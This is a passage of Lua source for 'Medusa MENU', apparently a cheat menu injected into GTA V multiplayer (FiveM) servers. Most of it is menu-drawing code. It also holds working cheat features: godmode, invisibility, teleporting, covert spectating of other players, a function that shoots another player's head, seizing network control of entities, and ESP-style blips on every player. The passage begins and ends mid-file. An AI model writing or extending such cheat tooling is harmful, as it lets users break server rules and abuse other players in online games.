	local InvokeNotification = function() return NotifyNewThread(options) end
	-- Delegate coroutine
	CreateThread(InvokeNotification) 
end

function Medusa.CreateMenu(id, title)

	-- Default settings
	menus[id] = {}
	menus[id].title = title
	menus[id].subTitle = "MAIN MENU"
	menus[id].branding = "Medusa MENU"
	menus[id].version = "v1.0.2"

	menus[id].visible = false

	menus[id].previousMenu = nil

	menus[id].aboutToBeClosed = false

	menus[id].x = 0.78
    menus[id].y = 0.19
    
    menus[id].width = menuWidth

	menus[id].currentOption = 1
	menus[id].storedOption = 1 -- This is used when going back to previous menu
	menus[id].maxOptionCount = 10
	menus[id].titleFont = 4
	menus[id].titleColor = {r = 255, g = 255, b = 255, a = 255}
	menus[id].background = "default"
	menus[id].titleBackgroundColor = {r = 0, g = 0, b = 0, a = 200}

	
	menus[id].menuTextColor = {r = 220, g = 220, b = 220, a = 255}
	menus[id].menuSubTextColor = {r = 140, g = 140, b = 140, a = 255}
	
	menus[id].menuFocusTextColor = {r = 255, g = 255, b = 255, a = 255}
	menus[id].menuFocusBackgroundColor = {r = 25, g = 25, b = 28, a = 215} -- rgb(31, 32, 34) rgb(155, 89, 182) #9b59b6
	menus[id].menuFocusPointerColor = {r = 255, g = 255, b = 255, a = 128}

	menus[id].menuBackgroundColor = {r = 0, g = 0, b = 0, a = 200} -- #121212
	menus[id].menuFrameColor = {r = 0, g = 0, b = 0, a = 255}
	menus[id].menuInvisibleColor = { r = 0, g = 0, b = 0, a = 0 }

	menus[id].buttonSubBackgroundColor = {r = 35, g = 39, b = 40, a = 255}

	menus[id].subTitleBackgroundColor = {
		r = menus[id].menuBackgroundColor.r,
		g = menus[id].menuBackgroundColor.g,
		b = menus[id].menuBackgroundColor.b,
		a = 255
	}

	menus[id].buttonPressedSound = {name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"} --https://pastebin.com/0neZdsZ5
end

function Medusa.CreateSubMenu(id, parent, subTitle)
	if menus[parent] then
		Medusa.CreateMenu(id, menus[parent].title)

		if subTitle then
			setMenuProperty(id, "subTitle", string.upper(subTitle))
		else
			setMenuProperty(id, "subTitle", string.upper(menus[parent].subTitle))
		end

		setMenuProperty(id, "previousMenu", parent)

		setMenuProperty(id, "x", menus[parent].x)
		setMenuProperty(id, "y", menus[parent].y)
		setMenuProperty(id, "maxOptionCount", menus[parent].maxOptionCount)
		setMenuProperty(id, "titleFont", menus[parent].titleFont)
		setMenuProperty(id, "titleColor", menus[parent].titleColor)
		setMenuProperty(id, "titleBackgroundColor", menus[parent].titleBackgroundColor)
		setMenuProperty(id, "titleBackgroundSprite", menus[parent].titleBackgroundSprite)
		setMenuProperty(id, "menuTextColor", menus[parent].menuTextColor)
		setMenuProperty(id, "menuSubTextColor", menus[parent].menuSubTextColor)
		setMenuProperty(id, "menuFocusTextColor", menus[parent].menuFocusTextColor)
		setMenuProperty(id, "menuFocusBackgroundColor", menus[parent].menuFocusBackgroundColor)
		setMenuProperty(id, "menuBackgroundColor", menus[parent].menuBackgroundColor)
		setMenuProperty(id, "subTitleBackgroundColor", menus[parent].subTitleBackgroundColor)
		
		setMenuProperty(id, "buttonSubBackgroundColor", menus[parent].buttonSubBackgroundColor)
	end
end

function Medusa.CurrentMenu()
	return currentMenu
end

function Medusa.OpenMenu(id)
	if id and menus[id] then
		if menus[id].titleBackgroundSprite then
			RequestStreamedTextureDict(menus[id].titleBackgroundSprite.dict, false)
			while not HasStreamedTextureDictLoaded(menus[id].titleBackgroundSprite.dict) do
				Citizen.Wait(0)
			end
		end
		
		setMenuVisible(id, true)
		PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
	end
end

function Medusa.IsMenuOpened(id)
	return isMenuVisible(id)
end

function Medusa.IsAnyMenuOpened()
	for id, _ in pairs(menus) do
		if isMenuVisible(id) then
			return true
		end
	end

	return false
end

function Medusa.IsMenuAboutToBeClosed()
	if menus[currentMenu] then
		return menus[currentMenu].aboutToBeClosed
	else
		return false
	end
end

function Medusa.CloseMenu()
	if menus[currentMenu] then
		if menus[currentMenu].aboutToBeClosed then
			menus[currentMenu].aboutToBeClosed = false
			setMenuVisible(currentMenu, false)
			PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			optionCount = 0
			currentMenu = nil
			currentKey = nil
		else
			menus[currentMenu].aboutToBeClosed = true
		end
	end
end

function Medusa.Button(text, subText, color, subcolor)

	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawButton(text, subText, color, subcolor)

		if isCurrent then
			if currentKey == Medusa.Config.Keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				return true
			end
		end

		return false
	end

end

-- Button with a slider
function Medusa.Slider(text, items, selectedIndex, callback, vehicleMod)
	local itemsCount = #items
	local selectedItem = items[selectedIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if vehicleMod then
		selectedIndex = selectedIndex + 2
	end

	if itemsCount > 1 and isCurrent then
		selectedItem = tostring(selectedItem)
	end

	if Medusa.SliderInternal(text, items, itemsCount, selectedIndex) then
		callback(selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == Medusa.Config.Keys.left then
            if selectedIndex > 1 then selectedIndex = selectedIndex - 1 end
		elseif currentKey == Medusa.Config.Keys.right then
            if selectedIndex < itemsCount then selectedIndex = selectedIndex + 1 end
		end
	end

	callback(selectedIndex)
	return false
end

local InCurrentAnimation = false

Medusa.Functions.AnimateSlider = function(CurrentPos, ToGoPos)
	if not InCurrentAnimation then
		InCurrentAnimation = true
		Medusa.Functions.Print(CurrentPos, ToGoPos)
	end
end

Medusa.Functions.FirstToUpper = function(str)
	return (str:gsub("^%l", string.upper))
end

local function drawButtonSlider(text, items, itemsCount, selectedIndex)
	local x = menus[currentMenu].x + menuWidth / 2
	local multiplier = nil

	if (menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount) and (optionCount <= menus[currentMenu].maxOptionCount) then
		multiplier = optionCount
	elseif (optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount) and (optionCount <= menus[currentMenu].currentOption) then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + separatorHeight + (buttonHeight * multiplier) - buttonHeight / 2 -- 0.0025 is the offset for the line under subTitle
		
		local backgroundColor = menus[currentMenu].menuBackgroundColor
		local textColor = menus[currentMenu].menuTextColor
		local subTextColor = menus[currentMenu].menuSubTextColor
		local shadow = false
		
		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			subTextColor = menus[currentMenu].menuFocusTextColor
		end

		local sliderColorBase = menus[currentMenu].buttonSubBackgroundColor
		local sliderColorKnob = {r = _menuColor.base.r , g = _menuColor.base.g , b = _menuColor.base.b , a = 255}
		local sliderColorText = {r = 206, g = 206, b = 206, a = 200}
		if selectedIndex > 1 then
			sliderColorBase = {r = _menuColor.base.r, g = _menuColor.base.g, b = _menuColor.base.b, a = 50}
			sliderColorKnob = {r = _menuColor.base.r, g = _menuColor.base.g, b = _menuColor.base.b, a = 180}
			sliderColorText = {r = _menuColor.base.r , g = _menuColor.base.g , b = _menuColor.base.b , a = 255}
		end

		local sliderOverlayWidth = sliderWidth / (itemsCount - 1)
		local x_togo = menuWidth / 2 - frameWidth / 2 - buttonTextXOffset - sliderWidth + (sliderOverlayWidth * (selectedIndex - 1))
		-- Button
		drawRect(x, y, menuWidth, buttonHeight, backgroundColor) -- Button Rectangle -2.15

		-- Button text
		drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow) -- Text

		
		-- Slider left
        drawRect(x + menuWidth / 2 - frameWidth / 2 - buttonTextXOffset - sliderWidth / 2, y, sliderWidth, sliderHeight, sliderColorBase)
		-- Slider right
		drawRect(x + menuWidth / 2 - frameWidth / 2 - buttonTextXOffset - (sliderOverlayWidth / 2) * (itemsCount - selectedIndex), y, sliderOverlayWidth * (itemsCount - selectedIndex), sliderHeight, menus[currentMenu].buttonSubBackgroundColor)
		-- Slider knob
		local xcache = x
		drawRect(x + menuWidth / 2 - frameWidth / 2 - buttonTextXOffset - sliderWidth + (sliderOverlayWidth * (selectedIndex - 1)), y, knobWidth, knobHeight, sliderColorKnob)
		--Medusa.Functions.Print("Antes: " .. menuWidth / 2 - frameWidth / 2 - buttonTextXOffset - sliderWidth + (sliderOverlayWidth * (selectedIndex - 1)) .. " Despues:" .. x_togo)
		-- Slider value text
		drawText(items[selectedIndex], x + menuWidth / 2 - frameWidth / 2 - buttonTextXOffset - sliderWidth / 2, y + separatorHeight / 2 - (buttonHeight / 2 - sliderFontHeight / 2), buttonFont, {r = _menuColor.base.r, g = _menuColor.base.g, b = _menuColor.base.b, a = 255}, sliderFontScale, true, shadow) -- Current Item Text
	end
end

function Medusa.SliderInternal(text, items, itemsCount, selectedIndex)
	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawButtonSlider(text, items, itemsCount, selectedIndex)

		if isCurrent then
			if currentKey == Medusa.Config.Keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				return true
			elseif currentKey == Medusa.Config.Keys.left or currentKey == Medusa.Config.Keys.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		
		return false
	end
end

function Medusa.MenuButton(text, id)
	if menus[id] then
		if Medusa.Button(text, "isMenu") then
			setMenuVisible(id, true)
			return true
		end
	end

	return false
end

function Medusa.CheckBox(text, bool, callback)
	local checked = "toggleOff"
	if bool then
		checked = "toggleOn"
	end

	if Medusa.Button(text, checked) then
		bool = not bool

		if callback then callback(bool) end

		return true
	end

	return false
end

function Medusa.ComboBoxInternal(text, selectedIndex)
	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawComboBox(text, selectedIndex)

		if isCurrent then
			if currentKey == Medusa.Config.Keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				return true
			elseif currentKey == Medusa.Config.Keys.left or currentKey == Medusa.Config.Keys.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		
		return false
	end
end

function Medusa.ComboBox(text, items, selectedIndex, callback, vehicleMod)
	local itemsCount = #items
	local selectedItem = items[selectedIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if vehicleMod then
		selectedIndex = selectedIndex + 1
		selectedItem = items[selectedIndex]
	end


	if itemsCount > 1 and isCurrent then
		selectedItem = tostring(selectedItem)
	end

	if Medusa.ComboBoxInternal(text, selectedItem) then
		callback(selectedIndex, selectedItem)
		return true
	end

	if isCurrent then
		if currentKey == Medusa.Config.Keys.left then
			if selectedIndex > 1 then selectedIndex = selectedIndex - 1 end
		elseif currentKey == Medusa.Config.Keys.right then
			if selectedIndex < itemsCount then selectedIndex = selectedIndex + 1 end
		end
	end

	callback(selectedIndex, selectedItem)

	return false
end

local DrawPlayerInfo = {
	pedHeadshot = false,
	txd = "null",
	handle = nil,
	currentPlayer = -1,
}

function Medusa.DrawPlayerInfo(player)
	-- Handles running code only once per user. Will run once per "SelectedPlayer" change
	if DrawPlayerInfo.currentPlayer ~= player then

		-- Current player selected
		DrawPlayerInfo.currentPlayer = player

		-- Drawing coordinates
		DrawPlayerInfo.mugshotWidth = buttonHeight / aspectRatio
		DrawPlayerInfo.mugshotHeight = DrawPlayerInfo.mugshotWidth * aspectRatio
		DrawPlayerInfo.x = menus[currentMenu].x - frameWidth / 2 - frameWidth - previewWidth / 2 
		DrawPlayerInfo.y = menus[currentMenu].y + titleHeight
		
		-- Player init
		DrawPlayerInfo.playerPed = GetPlayerPed(DrawPlayerInfo.currentPlayer)
		DrawPlayerInfo.playerName = Medusa:CheckName(GetPlayerName(DrawPlayerInfo.currentPlayer))


		local function RegisterPedHandle()
			
			if DrawPlayerInfo.handle and IsPedheadshotValid(DrawPlayerInfo.handle) then
		
				DrawPlayerInfo.pedHeadshot = false
				UnregisterPedheadshot(DrawPlayerInfo.handle)
				DrawPlayerInfo.handle = nil
				DrawPlayerInfo.txd = "null"
		
			end
		
			-- Get the ped headshot image.
			DrawPlayerInfo.handle = RegisterPedheadshot(DrawPlayerInfo.playerPed)
		
			while not IsPedheadshotReady(DrawPlayerInfo.handle) or not IsPedheadshotValid(DrawPlayerInfo.handle) do
				Wait(50)
			end
			
			if IsPedheadshotReady(DrawPlayerInfo.handle) and IsPedheadshotValid(DrawPlayerInfo.handle) then
				DrawPlayerInfo.txd = GetPedheadshotTxdString(DrawPlayerInfo.handle)
				DrawPlayerInfo.pedHeadshot = true
			else
				DrawPlayerInfo.pedHeadshot = false
			end
		end
		CreateThreadNow(RegisterPedHandle)
	end
	
	-- Pull coordinates from client (self)
	local client = GetEntityCoords(PlayerPedId())
	local cx, cy, cz = client[1], client[2], client[3]
	-- Pull coordinates from target (player)
	local target = GetEntityCoords(DrawPlayerInfo.playerPed)
	local tx, ty, tz = target[1], target[2], target[3]
	
	-- infoBox = {
	-- 	tostring("Name: " .. Medusa:CheckName(GetPlayerName(data))),
	-- 	tostring("Server ID: " .. GetPlayerServerId(data)),
	-- 	tostring("Player ID: ~t~" .. GetPlayerFromServerId(GetPlayerServerId(data))),
	-- 	tostring("Distance: ~f~" .. math.round(#(vector3(cx, cy, cz) - vector3(tx, ty, tz)), 1)),
	-- 	tostring("Status: " .. (IsPedDeadOrDying(dataPed, 1) and "~r~Dead " or "~g~Alive")),
	-- 	tostring("Task: " .. Medusa.Game:GetPedStatus(dataPed)),
	-- }

	-- [ NOTE ] refactor infoData into DrawPlayerInfo

	-- Define our infoData table
	local infoData = {}

	-- Get the vehicle model name instead of the label text to support custom vehicles
	local vehicleName = GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsIn(DrawPlayerInfo.playerPed)))
	
	-- Should work, but my local server isn't using MP peds, so I need to test once exec is updated.
	-- using "playerPed" instead of "player" for now
	local playerHealth = GetEntityHealth(DrawPlayerInfo.playerPed) - 100

	-- Update player armour every draw
	local playerArmour = GetPedArmour(DrawPlayerInfo.playerPed)

	-- Update player distance every draw
	local playerDistance = math.round(#(vector3(cx, cy, cz) - vector3(tx, ty, tz)), 1)
 
	-- Player IDs
	infoData[1] = {}
	infoData[1][1] = "Server / Local"
	if GetPlayerServerId(DrawPlayerInfo.currentPlayer) ~= nil and DrawPlayerInfo.currentPlayer ~= nil then
		infoData[1][2] = ("~b~%3d ~s~/~p~ %-3d"):format(GetPlayerServerId(DrawPlayerInfo.currentPlayer), DrawPlayerInfo.currentPlayer)
	else
		infoData[1][2] = "Failed To Load"
	end

	-- Player Vehicle
	infoData[2] = {}
	infoData[2][1] = "Vehicle"
	infoData[2][2] = vehicleName == "CARNOTFOUND" and "~r~NONE" or vehicleName
	
	-- Player Health
	infoData[3] = {}
	infoData[3][1] = "Health"
	infoData[3][2] = IsPedDeadOrDying(DrawPlayerInfo.playerPed, 1) and "~r~DEAD" or playerHealth

	-- Player Armour
	infoData[4] = {}
	infoData[4][1] = "Armour"
	infoData[4][2] = playerArmour

	-- Player Distance
	infoData[5] = {}
	infoData[5][1] = "Distance"
	infoData[5][2] = playerDistance
	
	-- local infoData = {
	-- 	tostring("Name: " .. Medusa:CheckName(GetPlayerName(data))),
	-- 	tostring("Server ID: " .. GetPlayerServerId(data)),
	-- 	tostring("Player ID: ~t~" .. GetPlayerFromServerId(GetPlayerServerId(data))),
	-- 	tostring("Distance: ~f~" .. math.round(#(vector3(cx, cy, cz) - vector3(tx, ty, tz)), 1)),
	-- 	tostring("Status: " .. (IsPedDeadOrDying(dataPed, 1) and "~r~Dead " or "~g~Alive")),
	-- 	tostring("Task: " .. vehicleName),
	-- }

	
	-- drawRect(DrawPlayerInfo.x, DrawPlayerInfo.y + footerHeight / 2, previewWidth, footerHeight, { r = 0, b = 0, g = 0, a = 255 })
	
	-- Header box
	drawRect(DrawPlayerInfo.x, DrawPlayerInfo.y + DrawPlayerInfo.mugshotHeight / 2, previewWidth, DrawPlayerInfo.mugshotHeight, { r = 0, g = 0, b = 0, a = 255 })
	drawText(DrawPlayerInfo.playerName, DrawPlayerInfo.x + DrawPlayerInfo.mugshotWidth + buttonTextXOffset / 2 - previewWidth / 2, DrawPlayerInfo.y - separatorHeight + (buttonHeight / 2 - fontHeight / 2), buttonFont, _menuColor.base, buttonScale, false, false)
	
	-- Ped preview
	if DrawPlayerInfo.pedHeadshot == true and IsPedheadshotValid(DrawPlayerInfo.handle) and IsPedheadshotReady(DrawPlayerInfo.handle) then
		DrawSprite(DrawPlayerInfo.txd, DrawPlayerInfo.txd, DrawPlayerInfo.x - previewWidth / 2 + DrawPlayerInfo.mugshotWidth / 2, DrawPlayerInfo.y + DrawPlayerInfo.mugshotHeight / 2, DrawPlayerInfo.mugshotWidth, DrawPlayerInfo.mugshotHeight, 0.0, 255, 255, 255, 255)
	end
	
	-- Separator
	drawRect(DrawPlayerInfo.x, DrawPlayerInfo.y + DrawPlayerInfo.mugshotHeight + separatorHeight / 2, previewWidth, separatorHeight, _menuColor.base)
	
	-- Content
	for i = 1, #infoData do
		local multiplier = i
		local text = infoData[i]
		-- Draw content background
		drawRect(DrawPlayerInfo.x, DrawPlayerInfo.y + buttonHeight + separatorHeight + footerHeight * multiplier - footerHeight / 2, previewWidth, footerHeight, menus[currentMenu].menuBackgroundColor)
		-- Draw info title (left)
		drawText(text[1], DrawPlayerInfo.x - previewWidth / 2 + buttonTextXOffset / 2, DrawPlayerInfo.y + buttonHeight + separatorHeight + footerHeight * (multiplier - 1) - separatorHeight + (footerHeight / 2 - fontHeight / 2), buttonFont, menus[currentMenu].menuTextColor, buttonScale, false, false)
		-- Draw info description (right)
		drawPreviewText(tostring(text[2]), DrawPlayerInfo.x + buttonTextXOffset, DrawPlayerInfo.y + buttonHeight + separatorHeight + footerHeight * (multiplier - 1) - separatorHeight + (footerHeight / 2 - fontHeight / 2), buttonFont, menus[currentMenu].menuTextColor, buttonScale, false, false, true)
		
	end

end

function Medusa.DrawWeaponPreview(index)
	local previewX = menus[currentMenu].x - frameWidth / 2
	local previewY = menus[currentMenu].y + titleHeight / 2 + previewWidth
	
	if index then
		RequestStreamedTextureDict(t_Weapons[index][4])
		if HasStreamedTextureDictLoaded(t_Weapons[index][4]) then
			drawRect((previewX - previewWidth / 2) - frameWidth, previewY + 0.005, previewWidth + 0.005, (0.1 * aspectRatio) / 2 + 0.01, menus[currentMenu].menuFrameColor)
			DrawSpriteScaled(t_Weapons[index][4], t_Weapons[index][3], (previewX - previewWidth / 2) - frameWidth, previewY + 0.005, previewWidth, nil, 0.0, 255, 255, 255, 255)
		end
	end

end

function Medusa.DrawVehiclePreview(vehClass)
	local previewX = menus[currentMenu].x - frameWidth / 2
	local previewY = menus[currentMenu].y + titleHeight / 2 + previewWidth
	local class = VehicleClass[vehClass]
	local index = menus[currentMenu].currentOption
	
	if class and index then
		RequestStreamedTextureDict(class[index][2])
		if HasStreamedTextureDictLoaded(class[index][2]) then
			drawRect((previewX - previewWidth / 2) - frameWidth, previewY + 0.005, previewWidth + 0.005, (0.1 * aspectRatio) / 2 + 0.01, menus[currentMenu].menuFrameColor)
			DrawSpriteScaled(class[index][2], class[index][3] or class[index][1], (previewX - previewWidth / 2) - frameWidth, previewY + 0.005, previewWidth, nil, 0.0, 255, 255, 255, 255)
		end
	end
end

function Medusa.Display()
	if isMenuVisible(currentMenu) then
		if menus[currentMenu].aboutToBeClosed then
			Medusa.CloseMenu()
		else
			SetScriptGfxDrawOrder(15)
			drawTitle()
			--drawSubTitle()
			drawFooter()

			currentKey = nil

			if IsDisabledControlJustPressed(0, Medusa.Config.Keys.down) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption < optionCount then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
				else
					menus[currentMenu].currentOption = 1
				end
			elseif IsDisabledControlJustPressed(0, Medusa.Config.Keys.up) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption > 1 then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
				else
					menus[currentMenu].currentOption = optionCount
				end
			elseif IsDisabledControlJustPressed(0, Medusa.Config.Keys.left) then
				currentKey = Medusa.Config.Keys.left
			elseif IsDisabledControlJustPressed(0, Medusa.Config.Keys.right) then
				currentKey = Medusa.Config.Keys.right
			elseif IsDisabledControlJustPressed(0, Medusa.Config.Keys.select) then
				currentKey = Medusa.Config.Keys.select
			elseif IsDisabledControlJustPressed(0, Medusa.Config.Keys.back) then
				if menus[menus[currentMenu].previousMenu] then
					PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
					setMenuVisible(menus[currentMenu].previousMenu, true, true)
				else
					Medusa.CloseMenu()
				end
			end

			optionCount = 0
		end
	end
end

function Medusa.SetMenuWidth(id, width)
	setMenuProperty(id, "width", width)
end

function Medusa.SetMenuX(id, x)
	setMenuProperty(id, "x", x)
end

function Medusa.SetMenuY(id, y)
	setMenuProperty(id, "y", y)
end

function Medusa.SetMenuMaxOptionCountOnScreen(id, count)
	setMenuProperty(id, "maxOptionCount", count)
end

function Medusa.SetTitleColor(id, r, g, b, a)
	setMenuProperty(id, "titleColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a})
end

function Medusa.SetTitleBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"titleBackgroundColor",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a}
	)
end

function Medusa.SetTitleBackgroundSprite(id, textureDict, textureName)
	setMenuProperty(id, "titleBackgroundSprite", {dict = textureDict, name = textureName})
end

function Medusa.SetSubTitle(id, text)
	setMenuProperty(id, "subTitle", string.upper(text))
end

function Medusa.SetMenuBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"menuBackgroundColor",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a}
	)
end

function Medusa.SetMenuTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a})
end

function Medusa.SetMenuSubTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuSubTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a})
end

function Medusa.SetMenuFocusColor(id, r, g, b, a)
	setMenuProperty(id, "menuFocusColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a})
end

function Medusa.SetMenuButtonPressedSound(id, name, set)
	setMenuProperty(id, "buttonPressedSound", {["name"] = name, ["set"] = set})
end

local function DrawText3D(x, y, z, text, r, g, b)
	SetDrawOrigin(x, y, z, 0)
	SetTextFont(0)
	SetTextProportional(0)
	SetTextScale(0.0, 0.20)
	SetTextColour(r, g, b, 255)
	SetTextDropshadow(0, 0, 0, 0, 255)
	SetTextEdge(2, 0, 0, 0, 150)
	SetTextDropShadow()
	SetTextOutline()
	SetTextEntry("STRING")
	SetTextCentre(1)
	AddTextComponentString(text)
	EndTextCommandDisplayText(0.0, 0.0)
	ClearDrawOrigin()
end

local function DrawText3DFill(x, y, z, text, r, g, b)
	SetDrawOrigin(x, y, z, 0)
	SetTextFont(0)
	SetTextProportional(0)
	SetTextScale(0.0, 0.20)
	SetTextColour(r, g, b, 255)
	SetTextDropshadow(0, 0, 0, 0, 255)
	SetTextEdge(2, 0, 0, 0, 150)
	SetTextDropShadow()
	SetTextOutline()
	SetTextEntry("STRING")
	SetTextCentre(1)
	AddTextComponentString(text)
	EndTextCommandDisplayText(0.0, 0.0)
	ClearDrawOrigin()
end

function math.round(num, numDecimalPlaces)
	return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
end

local function RGBRainbow(frequency)
	local result = {}
	local curtime = GetGameTimer() / 1000

	result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
	result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
	result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

	return result
end

local function TeleportToWaypoint()
	local WaypointHandle = GetFirstBlipInfoId(8)

  	if DoesBlipExist(WaypointHandle) then
  		local waypointCoords = GetBlipInfoIdCoord(WaypointHandle)
		for height = 1, 1000 do
			SetPedCoordsKeepVehicle(PlayerPedId(), waypointCoords["x"], waypointCoords["y"], height + 0.0)

			local foundGround, zPos = GetGroundZFor_3dCoord(waypointCoords["x"], waypointCoords["y"], height + 0.0)

			if foundGround then
				SetPedCoordsKeepVehicle(PlayerPedId(), waypointCoords["x"], waypointCoords["y"], height + 0.0)

				break
			end

			Citizen.Wait(0)
		end
	else
		Medusa.SendNotification({text = "You must place a waypoint", type = 'error'})
	end
end

local function SpectatePlayer(selectedPlayer)
	local selectedPlayerPed = GetPlayerPed(selectedPlayer)
	
	if Medusa.Player.Spectating then

		RequestCollisionAtCoord(GetEntityCoords(PlayerPedId()))

		DoScreenFadeOut(500)
		while IsScreenFadingOut() do Wait(0) end

		NetworkSetInSpectatorMode(false, 0)
		SetMinimapInSpectatorMode(false, 0)

		ClearPedTasks(PlayerPedId())
		DoScreenFadeIn(500)

	else

		DoScreenFadeOut(500)
		while IsScreenFadingOut() do Wait(0) end

		RequestCollisionAtCoord(GetEntityCoords(selectedPlayerPed))

		NetworkSetInSpectatorMode(false, 0)
		NetworkSetInSpectatorMode(true, selectedPlayerPed)
		SetMinimapInSpectatorMode(true, selectedPlayerPed)

		TaskWanderStandard(PlayerPedId(), 0, 0)
		DoScreenFadeIn(500)
		
	end

	Medusa.Player.Spectating = not Medusa.Player.Spectating
end

function ShootPlayer(player)
	local head = GetPedBoneCoords(player, GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.0, 0.0)
	SetPedShootsAtCoord(PlayerPedId(), head.x, head.y, head.z, true)
end

local function RequestControl(entity)
	local Waiting = 0
	NetworkRequestControlOfEntity(entity)
	while not NetworkHasControlOfEntity(entity) do
		Waiting = Waiting + 100
		Citizen.Wait(100)
		if Waiting > 5000 then
			break
		end
	end
end

local ptags = {}
-- Thread that handles all menu toggles (Godmode, ESP, etc)
local function MenuToggleThread()
	while isMenuEnabled do

		-- Radar/showMinimap
		DisplayRadar(showMinimap, 1)
		Medusa.Player.IsInVehicle = IsPedInAnyVehicle(PlayerPedId(), 0)

		SetPlayerInvincible(PlayerId(), Godmode)
		SetEntityInvincible(PlayerPedId(), Godmode)

		SetPedCanBeKnockedOffVehicle(PlayerPedId(), Medusa.Toggle.VehicleNoFall) 

		SetEntityVisible(PlayerPedId(), not Invisible, 0)

		SetPedCanRagdoll(PlayerPedId(), not RagdollToggle)

		if Crosshair then
			EnableCrosshairThisFrame()
			ShowHudComponentThisFrame(14)
		end

		if playerBlips then
			-- show blips
			local plist = GetActivePlayers()
			for i = 1, #plist do
				local id = plist[i]
				local ped = GetPlayerPed(id)
				if ped ~= PlayerPedId() then
					local blip = GetBlipFromEntity(ped)

					-- HEAD DISPLAY STUFF --

					-- Create head display (this is safe to be spammed)
					-- headId = Citizen.InvokeNative( 0xBFEFE3321A3F5015, ped, GetPlayerName( id ), false, false, "", false )

					-- Speaking display
					-- I need to move this over to name tag code
					-- if NetworkIsPlayerTalking(id) then
					-- 	Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 9, true ) -- Add speaking sprite
					-- else
					-- 	Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 9, false ) -- Remove speaking sprite
					-- end

					-- BLIP STUFF --

					if not DoesBlipExist(blip) then -- Add blip and create head display on player
						blip = AddBlipForEntity(ped)
						SetBlipSprite(blip, 1)
						Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true ) -- Player Blip indicator
					else -- update blip
						local veh = GetVehiclePedIsIn(ped, false)
						local blipSprite = GetBlipSprite(blip)

						if GetEntityHealth(ped) == 0 then -- dead
							if blipSprite ~= 274 then
								SetBlipSprite(blip, 274)
								Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true ) -- Player Blip indicator
							end
						elseif veh then
							local vehClass = GetVehicleClass(veh)
							local vehModel = GetEntityModel(veh)
							if vehClass == 15 then -- Helicopters
								if blipSprite ~= 422 then
									SetBlipSprite(blip, 422)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehClass == 8 then -- Motorcycles
								if blipSprite ~= 226 then
									SetBlipSprite(blip, 226)
									Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
								end
							elseif vehClass == 16 then -- Plane
								if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra") or vehModel == GetHashKey("lazer") then -- Jets
									if blipSprite ~= 424 then
										SetBlipSprite(blip, 424)
										Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true) -- Player Blip indicator
									end
								elseif blipSprite ~= 423 then
